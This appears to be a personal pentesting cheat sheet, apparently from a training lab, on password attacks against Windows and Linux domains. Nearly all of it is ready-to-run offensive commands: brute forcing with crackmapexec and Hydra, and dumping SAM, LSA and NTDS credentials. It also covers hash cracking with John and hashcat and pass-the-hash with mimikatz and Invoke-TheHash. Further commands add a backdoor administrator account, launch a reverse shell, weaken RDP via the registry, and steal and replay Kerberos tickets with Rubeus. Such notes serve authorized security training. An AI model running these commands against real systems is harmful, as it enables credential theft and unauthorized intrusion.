Navigation: [[Pentesting]]

---
# Table of Contents
1. Password Mutations
2. Remote Password Attacks
3. Cracking Passwords
4. Pass the Hash
5. Pass the Ticket

# Password Mutations
**Hashcat**
We can use `hashcat` to generate a list of mutated passwords using this rule list:

| **Function** | **Description**                                   |
| ------------ | ------------------------------------------------- |
| `:`          | Do nothing.                                       |
| `l`          | Lowercase all letters.                            |
| `u`          | Uppercase all letters.                            |
| `c`          | Capitalize the first letter and lowercase others. |
| `sXY`        | Replace all instances of X with Y.                |
| `$!`         | Add the exclamation character at the end.         |

Full docs can be found [here](https://hashcat.net/wiki/doku.php?id=rule_based_attack). Here's a sample rules file:
```shell
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Here's how we can generate that word list:
```shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Hashcat also comes with a prebuilt ruleset:
```
ls /usr/share/hashcat/rules/
```

**Word List from Site**
There's a tool called [`CeWL`](https://github.com/digininja/CeWL) that can generate a word list based off of words found in a company site:
```shell
cewl <domain> -d <depth> -m <min word len> --lowercase -w <outfile>
```

**Generate Potential Usernames**
[Username anarchy](https://github.com/urbanadventurer/username-anarchy) is a tool that can be used to generate potential usernames given a premade list of first and last names:
```shell
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```
# Remote Password Attacks
### Crackmapexec
**General Brute Force**
```shell
crackmapexec winrm <ip> -u user.list -p password.list # brute force users
crackmapexec smb <ip> -u "user" -p "password" --shares # enumerate shares
```

**Dumping Credentials**
```shell
# All of these require admin perms
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam 
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

crackmapexec smb <ip> -u <username> -p <password> --ntds
```
### Hydra
```shell
# Using lists, for non lists use -l and -p respectively
hydra -L user.list -P password.list <service>://<ip>

# Using a list of credentials
hydra -C <user_pass.list> ssh://<IP>
```
# Cracking Passwords
### John the Ripper
By far one of the best cracking tools. Learn to use it well. [Source link](https://www.openwall.com/john/).
```shell
# General syntax
john --format=<format> hashes_to_crack.txt
john --show hashes_to_crack.txt

# Using a wordlist:
john --wordlist=<wordlist_file> --rules <hash_file>

# Incremental mode
john --incremental <hash_file>

# John has a list of tools for cracking files:
<tool> <file_to_crack> > file.hash # produces a hash file to be cracked
john --wordlist=<wordlist> file.hash
john file.hash --show

# Cracking bitlocker
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
```
### Hashcat
Another very useful tool. [Source link](https://hashcat.net/hashcat/)
```shell
# NTLM hashes using a wordlist
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

# Single NTLM hash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Cracking passwd.bak and shadow.bk
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# MD5
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

# Hashcat with John for bitlocker
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```
# Pass the Hash
We'll be using [`mimikatz`](https://github.com/ParrotSec/mimikatz) for this. Another tool is [`Invoke-TheHash`](https://github.com/Kevin-Robertson/Invoke-TheHash). 

**Running Pass the Hash Locally**
```shell
mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<RC4 hash> /domain:<domain> /run:cmd.exe" exit
# We can also use /NTLM for NTLM hashes
# If our domain is local, we can use localhost, the computer name, or just '.'
```

**Remote On Internal Network**
```PowerShell
# From our Invoke-TheHash Directory:
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <hostname/IP> -Domain <domain> -Username <user> -Hash <NTLM Hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Running a reverse shell
# Note that we need to do the first import from above before this
# We'll also need a listener using netcat
Invoke-WMIExec -Target DC01 -Domain <domain> -Username <user> -Hash <NTLM> -Command "<powershell reverse shell>"

```

**From Remote on Linux**
We'll be using [Impacket](https://github.com/SecureAuthCorp/impacket) for this:
```shell
impacket-psexec <user>@<host> -hashes :<hash>
```

We also have [evil-winrm](https://github.com/Hackplayers/evil-winrm) or just RDP:
```shell
evil-winrm -i <host> -u Administrator -H <hash>

xfreerdp  /v:<host> /u:<user> /pth:<hash>

# note that we'll need to run the following on the Windows host we intend to remote into using RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0
```
# Pass the Ticket
We'll need `mimikatz` from the above section. We'll also be using [`Rubeus`](https://github.com/GhostPack/Rubeus) and [`Linikatz`](https://github.com/CiscoCXSecurity/linikatz). 
### Windows
##### Exporting Tickets
```shell
# Requires admin perms
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

Rubeus.exe dump /nowrap
```
##### Converting Keys to Tickets
```shell
mimikatz.exe
privilege::debug
sekurlsa::ekeys
sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<hash from ekeys>

Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes key> /nowrap
```
##### Performing Pass the Ticket
```shell
mimikatz.exe 
privilege::debug
kerberos::ptt "C:/ticket/location"
exit
# We should have a shell of the user now

# If we've converted with rubeus, we can simply use the below
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<hash> /ptt

# With Rubeus, we can import a ticket the following way:
Rubeus.exe ptt /ticket:<location>

# Convert .kirbi to B64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<path>"))
Rubeus.exe ptt /ticket:<B64>

# Rubeus allows us to create a sacrificial process to prevent erasure of TGTs for the session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Lateral Movement:
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<hash> /ptt
powershell
```
### Linux
##### Enumeration
```shell
# Checking for domains
realm list # list joined domains
ps -ef | grep -i "winbind\|sssd" # check if domain joined

# Finding keys
find / -name *keytab* -ls 2>/dev/null
crontab -l
env | grep -i krb5
ls -la /tmp
```
##### Extracting KeyTabs
Use this tool: [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
```shell
python3 /opt/keytabextract.py <keyfile>
```

This will provide us an NTLM hash that we can crack now.
##### Using CCache Files
```shell
export KRB5CCNAME=<path>
```


---
Navigation: [[Pentesting]]